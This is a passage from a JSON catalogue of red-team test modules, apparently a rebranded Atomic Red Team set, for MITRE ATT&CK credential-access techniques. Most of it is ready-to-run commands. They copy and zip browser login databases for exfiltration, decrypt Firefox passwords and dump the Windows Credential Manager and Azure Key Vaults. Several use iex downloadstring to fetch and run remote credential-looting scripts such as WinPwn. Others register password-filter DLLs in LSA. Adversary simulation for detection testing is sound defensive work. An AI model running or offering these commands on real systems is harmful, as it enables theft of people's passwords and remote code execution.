      "description": "Simulates an adversary accessing encrypted credentials from Edge web browser's login database.\nmore info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\" -Destination \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Edge\" -Force -Recurse\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Edge\" -Force -ErrorAction Ignore -Recurse\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Edge must be installed\n",
          "check_command": "if (Test-Path \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\") {exit 0} else {exit 1}",
          "install_command": "\"Installation is not implemented as Edge is a part of windows\"\n"
        },
        {
          "description": "Edge login data file must exist\n",
          "check_command": "if (Test-Path \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\") {exit 0} else {exit 1}",
          "install_command": "$edge=\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"\nStart-Process $edge \nStart-Sleep -s 20\nStop-Process -Name msedge\n"
        }
      ],
      "rx_module_id": "a6a5ec26-a2d1-4109-9d35-58b867689329",
      "module_name": "Simulating access to Windows Edge Login Data"
    },
    {
      "index": 1440,
      "technique_id": "T1555.003",
      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
      "description": "Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.\nUpon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. \n\nWill create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$PasswordDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\ncmd /c #{venv_path}\\Scripts\\python.exe #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}\ncat #{Out_Filepath}\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \"#{Out_Filepath}\" -erroraction silentlycontinue   \n"
      },
      "variables": [
        {
          "name": "Firepwd_Path",
          "description": "Filepath for Firepwd.py",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\venv_t1555.004\\Scripts\\Firepwd.py"
        },
        {
          "name": "Out_Filepath",
          "description": "Filepath to output results to",
          "type": "string",
          "default_value": "$env:temp\\T1555.003Test8.txt"
        },
        {
          "name": "VS_CMD_Path",
          "description": "Filepath to Visual Studio Build Tools Command prompt",
          "type": "string",
          "default_value": "C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat"
        },
        {
          "name": "Python_Path",
          "description": "Filepath to python",
          "type": "string",
          "default_value": "C:\\Program Files\\Python310\\python.exe"
        },
        {
          "name": "venv_path",
          "description": "Path to the folder for the tactics venv",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\venv_t1555.004"
        }
      ],
      "prerequisites": [
        {
          "description": "Firefox profile directory must be present\n",
          "check_command": "if (get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\" -erroraction silentlycontinue) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\firefox.msi\"\nmsiexec.exe /i \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\firefox.msi\" /quiet\nsleep -s 30\nstart-process \"$env:programfiles\\Mozilla Firefox\\firefox.exe\".\nsleep -s 5\nstop-process -name \"firefox\"\n"
        },
        {
          "description": "Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}\n",
          "check_command": "if (Test-Path \"#{VS_CMD_Path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://aka.ms/vs/17/release/vs_BuildTools.exe\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\VS_BuildTools.exe\"\nwrite-host \"Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from PathToRagloxModulesFolder\\..\\ExternalPayloads\\VS_BuildTools.exe.\"\n"
        },
        {
          "description": "Python must be installed\n",
          "check_command": "if (Test-Path \"#{Python_Path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
        },
        {
          "description": "Computer must have venv configured at #{venv_path}\n",
          "check_command": "if (Test-Path -Path \"#{venv_path}\") { exit 0 } else { exit 1 }\n",
          "install_command": "py -m venv \"#{venv_path}\"\n"
        },
        {
          "description": "Firepwd must exist at #{Firepwd_Path}\n",
          "check_command": "if (Test-Path \"#{Firepwd_Path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py\" -outfile \"#{Firepwd_Path}\"\n"
        },
        {
          "description": "Pycryptodome library must be installed \n",
          "check_command": "if (#{venv_path}\\Scripts\\pip.exe show pycryptodome) {exit 0} else {exit 1}\n",
          "install_command": "if (test-path \"#{VS_CMD_Path}\"){#{venv_path}\\Scripts\\pip.exe install pycryptodome | out-null | cmd /c %comspec% /k \"#{VS_CMD_Path}\" | out-null} else {write-host \"Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq\"}\n"
        },
        {
          "description": "Pyasn1 library must be installed \n",
          "check_command": "if (#{venv_path}\\Scripts\\pip.exe show pyasn1) {exit 0} else {exit 1}\n",
          "install_command": "if (test-path \"#{VS_CMD_Path}\") & {#{venv_path}\\Scripts\\pip.exe install pyasn1 | out-null | cmd /c %comspec% /k \"#{VS_CMD_Path}\" | out-null} else {write-host \"Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq.\"}\n"
        }
      ],
      "rx_module_id": "dc9cd677-c70f-4df5-bd1c-f114af3c2381",
      "module_name": "Decrypt Mozilla Passwords with Firepwd.py"
    },
    {
      "index": 1441,
      "technique_id": "T1555.003",
      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
      "description": "Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}",
        "elevation_required": true,
        "cleanup_command": "rm -R /tmp/LaZagne; rm -f #{output_file}"
      },
      "variables": [
        {
          "name": "lazagne_path",
          "description": "Path you put LaZagne Github with LaZagne.py",
          "type": "string",
          "default_value": "/tmp/LaZagne/Linux"
        },
        {
          "name": "specific_module",
          "description": "You may change the module to \"all\" for all password that can be found by LaZagne.py",
          "type": "string",
          "default_value": "browsers -firefox"
        },
        {
          "name": "output_file",
          "description": "This is where output for the Firefox passwords goes",
          "type": "string",
          "default_value": "/tmp/firefox_password.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Get Lazagne from Github and install requirements",
          "check_command": "test -f #{lazagne_path}/laZagne.py",
          "install_command": "cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt"
        },
        {
          "description": "Needs git, python3 and some pip stuff",
          "check_command": "which git && which python3 && which pip",
          "install_command": "apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto"
        }
      ],
      "rx_module_id": "87e88698-621b-4c45-8a89-4eaebdeaabb1",
      "module_name": "LaZagne.py - Dump Credentials from Firefox Browser"
    },
    {
      "index": 1442,
      "technique_id": "T1555.003",
      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
      "description": "This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,\nsimulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$exfil_folder = \"$env:temp\\T1555.003\"\nif (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} \ncompress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \"$env:temp\\T1555.003.zip\" -force -erroraction silentlycontinue   \nRemove-Item -Path \"$env:temp\\T1555.003\\\" -force -recurse -erroraction silentlycontinue\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f543635c-1705-42c3-b180-efd6dc6e7ee7",
      "module_name": "Stage Popular Credential Files for Exfiltration"
    },
    {
      "index": 1443,
      "technique_id": "T1555.003",
      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
      "description": "Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbrowserpwn -consoleoutput -noninteractive",
        "elevation_required": false,
        "cleanup_command": "rm .\\System.Data.SQLite.dll -ErrorAction Ignore"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "764ea176-fb71-494c-90ea-72e9d85dce76",
      "module_name": "WinPwn - BrowserPwn"
    },
    {
      "index": 1444,
      "technique_id": "T1555.003",
      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
      "description": "Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nkittenz -consoleoutput -noninteractive",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ec1d0b37-f659-4186-869f-31a554891611",
      "module_name": "WinPwn - Loot local Credentials - mimi-kittenz"
    },
    {
      "index": 1445,
      "technique_id": "T1555.003",
      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
      "description": "PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')\nInvoke-Sharpweb -command \"all\"",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "e5e3d639-6ea8-4408-9ecd-d5a286268ca0",
      "module_name": "WinPwn - PowerSharpPack - Sharpweb for Browser Credentials"
    },
    {
      "index": 1446,
      "technique_id": "T1555.003",
      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
      "description": "This test locates the Login Data files used by Chrome to store encrypted credentials, then copies them to the temp directory for later exfil. \nOnce the files are exfiltrated, malware like CookieMiner could be used to perform credential extraction. \nSee https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/ . \n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data\" \"/tmp/T1555.003_Login Data\"\ncp ~/Library/\"Application Support/Google/Chrome/Default/Login Data For Account\" \"/tmp/T1555.003_Login Data For Account\"\n",
        "elevation_required": false,
        "cleanup_command": "rm \"/tmp/T1555.003_Login Data\" >/dev/null 2>&1\nrm \"/tmp/T1555.003_Login Data For Account\" >/dev/null 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "124e13e5-d8a1-4378-a6ee-a53cd0c7e369",
      "module_name": "Simulating Access to Chrome Login Data - MacOS"
    },
    {
      "index": 1447,
      "technique_id": "T1555.003",
      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
      "description": "The following RAGLOX test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to retrieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process \"#{webbrowserpassview_path}\"\nStart-Sleep -Second 4\nStop-Process -Name \"WebBrowserPassView\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "webbrowserpassview_path",
          "description": "Path to the WebBrowserPassView executable ",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1555.003\\bin\\WebBrowserPassView.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if WebBrowserPassView.exe exists in the specified path #{webbrowserpassview_path}\n",
          "check_command": "if (Test-Path \"#{webbrowserpassview_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\T1555.003\\bin\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1555.003/bin/WebBrowserPassView.exe -OutFile \"#{webbrowserpassview_path}\"\n"
        }
      ],
      "rx_module_id": "e359627f-2d90-4320-ba5e-b0f878155bbe",
      "module_name": "WebBrowserPassView - Credentials from Browser"
    },
    {
      "index": 1448,
      "technique_id": "T1555.003",
      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
      "description": "[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.\nIf using to test with Firefox, if the browser is x64 you need to use the x64 build\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$profile = (Gci -filter \"*default-release*\" -path $env:Appdata\\Mozilla\\Firefox\\Profiles\\).FullName\nCopy-Item $profile\\key4.db -Destination \"PathToRagloxModulesFolder\\..\\ExternalPayloads\" > $null\nCopy-Item $profile\\logins.json -Destination \"PathToRagloxModulesFolder\\..\\ExternalPayloads\" > $null\nRemove-Item $profile\\key4.db > $null\nRemove-Item $profile\\logins.json > $null\nCopy-Item \"$env:PathToRagloxModulesFolder\\T1555.003\\src\\key4.db\" -Destination $profile\\ > $null\nCopy-Item \"$env:PathToRagloxModulesFolder\\T1555.003\\src\\logins.json\" -Destination $profile\\ > $null\ncd \"$env:PathToRagloxModulesFolder\\T1555.003\\bin\"\n\"\"|.\\BrowserCollector.exe\n",
        "elevation_required": false,
        "cleanup_command": "$profile = (Gci -filter \"*default-release*\" -path $env:Appdata\\Mozilla\\Firefox\\Profiles\\).FullName\nRemove-Item $profile\\key4.db > $null\nRemove-Item $profile\\logins.json > $null\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\" -Destination $profile\\ > $null\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\key4.db\" > $null\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\logins.json\" > $null\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Firefox must be on the device.\n",
          "check_command": "if ((Test-Path \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\")) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\FirefoxStubInstaller.exe\"\nInvoke-WebRequest -OutFile $installer \"https://download.mozilla.org/?product=firefox-stub&os=win&lang=en-US\"\nStart-Process -FilePath $installer -Wait\nStop-Process -Name \"firefox\"\n"
        },
        {
          "description": "BrowserCollector must exist in the bin directory\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\T1555.003\\bin\\BrowserCollector.exe\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\T1555.003\\bin\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe\" -Outfile: \"PathToRagloxModulesFolder\\T1555.003\\bin\\BrowserCollector.exe\""
        },
        {
          "description": "Login Data file that is a copy of a Firefox Login Data that contains credentials for the tool to \"steal.\" Must exist at the specified path.\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\T1555.003\\src\\key4.db\") {exit 0} else {exit 1}",
          "install_command": "Invoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/blob/master/rx_modules/T1555.003/src/key4.db?raw=true\" -Outfile: \"PathToRagloxModulesFolder\\T1555.003\\src\\key4.db\"\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/blob/master/rx_modules/T1555.003/src/logins.json?raw=true\" -Outfile: \"PathToRagloxModulesFolder\\T1555.003\\src\\logins.json\" "
        }
      ],
      "rx_module_id": "6f2c5c87-a4d5-4898-9bd1-47a55ecaf1dd",
      "module_name": "BrowserStealer (Chrome / Firefox / Microsoft Edge)"
    },
    {
      "index": 1449,
      "technique_id": "T1555.003",
      "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
      "description": "This test simulates an adversary using esentutl to dump encrypted credentials from Google Chrome's Login database.\n[Reference](https://actzero.ai/resources/blog/hygiene-tip-shut-down-attackers-harvesting-cached-browser-credentials/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "esentutl.exe /y \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" /d \"#{output_path}\"\n",
        "elevation_required": false,
        "cleanup_command": "del /f /q #{output_path} > nul 2>&1\n"
      },
      "variables": [
        {
          "name": "output_path",
          "description": "File path for login data dump",
          "type": "string",
          "default_value": "%temp%\\T1555.003_Login_Data.tmp"
        }
      ],
      "prerequisites": [
        {
          "description": "Chrome must be installed\n",
          "check_command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n"
        }
      ],
      "rx_module_id": "70422253-8198-4019-b617-6be401b49fce",
      "module_name": "Dump Chrome Login Data with esentutl"
    },
    {
      "index": 1450,
      "technique_id": "T1555.004",
      "technique_name": "Credentials from Password Stores: Windows Credential Manager",
      "description": "List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe\nCredential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos\nhttps://blog.malwarebytes.com/101/2016/01/the-windows-vaults/\nhttps://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "vaultcmd /listcreds:\"Windows Credentials\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "9c2dd36d-5c8b-4b29-8d72-a11b0d5d7439",
      "module_name": "Access Saved Credentials via VaultCmd"
    },
    {
      "index": 1451,
      "technique_id": "T1555.004",
      "technique_name": "Credentials from Password Stores: Windows Credential Manager",
      "description": "Loot local Credentials - Invoke-WCMDump technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')\nInvoke-WCMDump",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "fa714db1-63dd-479e-a58e-7b2b52ca5997",
      "module_name": "WinPwn - Loot local Credentials - Invoke-WCMDump"
    },
    {
      "index": 1452,
      "technique_id": "T1555.006",
      "technique_name": "Credentials from Password Stores: Cloud Secrets Management Stores",
      "description": "Upon successful execution of this test, the names, locations, and contents of key vaults within an Azure account will be output to a file.\nSee - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/",
      "execution": {
        "platforms": [
          "iaas:azure"
        ],
        "executor_type": "powershell",
        "command": "import-module \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1\"\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzureRmAccount -Credential $Credential\nGet-AzurePasswords -subscription '#{subscription_id}' > #{output_file}\ncat #{output_file}\n",
        "elevation_required": true,
        "cleanup_command": "remove-item #{output_file} -force -erroraction silentlycontinue\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Azure AD username",
          "type": "string",
          "default_value": null
        },
        {
          "name": "password",
          "description": "Azure AD password",
          "type": "string",
          "default_value": "T1082Az"
        },
        {
          "name": "output_file",
          "description": "File to dump results to",
          "type": "string",
          "default_value": "$env:temp\\T1528Test1.txt"
        },
        {
          "name": "subscription_id",
          "description": "Azure subscription id to search",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "The Get-AzurePasswords script must exist in PathToRagloxModulesFolder\\..\\ExternalPayloads.\n",
          "check_command": "if (test-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1\"){exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1\"\n"
        },
        {
          "description": "The Azure RM module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name AzureRM -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name AzureRM -Force -allowclobber\n"
        },
        {
          "description": "The Azure module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name Azure -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name Azure -Force -allowclobber\n"
        }
      ],
      "rx_module_id": "1b83cddb-eaa7-45aa-98a5-85fb0a8807ea",
      "module_name": "Azure - Dump All Azure Key Vaults with Microburst"
    },
    {
      "index": 1453,
      "technique_id": "T1556.002",
      "technique_name": "Modify Authentication Process: Password Filter DLL",
      "description": "Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ \"PathToRagloxModulesFolder\\T1556.002\\lsa_backup.reg\"\n$passwordFilterName = (Copy-Item \"#{dll_path}\\#{dll_name}\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\")\n$notificationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues\n",
        "elevation_required": true,
        "cleanup_command": "reg.exe import \"PathToRagloxModulesFolder\\T1556.002\\lsa_backup.reg\"\nremove-item C:\\Windows\\System32\\#{dll_name}\n"
      },
      "variables": [
        {
          "name": "dll_path",
          "description": "Path to DLL to be installed and registered",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1556.002\\bin"
        },
        {
          "name": "dll_name",
          "description": "Name of the Password Filter",
          "type": "string",
          "default_value": "RAGLOXRedTeamPWFilter.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "RAGLOXRedTeamPWFilter.dll must exist on disk at specified location (#{dll_path}\\#{dll_name})\n",
          "check_command": "if (Test-Path \"#{dll_path}\\#{dll_name}\") {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox/rx_modules/T1556.002/bin/RAGLOXRedTeamPWFilter.dll\" -OutFile \"#{dll_path}\\#{dll_name}\"\n"
        }
      ],
      "rx_module_id": "a7961770-beb5-4134-9674-83d7e1fa865c",
      "module_name": "Install and Register Password Filter DLL"
    },
    {
      "index": 1454,
      "technique_id": "T1556.002",
      "technique_name": "Modify Authentication Process: Password Filter DLL",
      "description": "lsass.exe loads all DLLs specified by the Authentication Packages REG_MULTI_SZ value.\nUses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ \"PathToRagloxModulesFolder\\T1556.002\\lsa_backup.reg\"\n$passwordFilterName = (Copy-Item \"#{dll_path}\\#{dll_name}\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$AuthenticationPackagesValues = $lsaKey.GetValue(\"Authentication Packages\")\n$AuthenticationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Authentication Packages\" $AuthenticationPackagesValues\n",
        "elevation_required": true,
        "cleanup_command": "reg.exe import \"PathToRagloxModulesFolder\\T1556.002\\lsa_backup.reg\"\nremove-item C:\\Windows\\System32\\#{dll_name}\n"
      },
      "variables": [
        {
          "name": "dll_path",
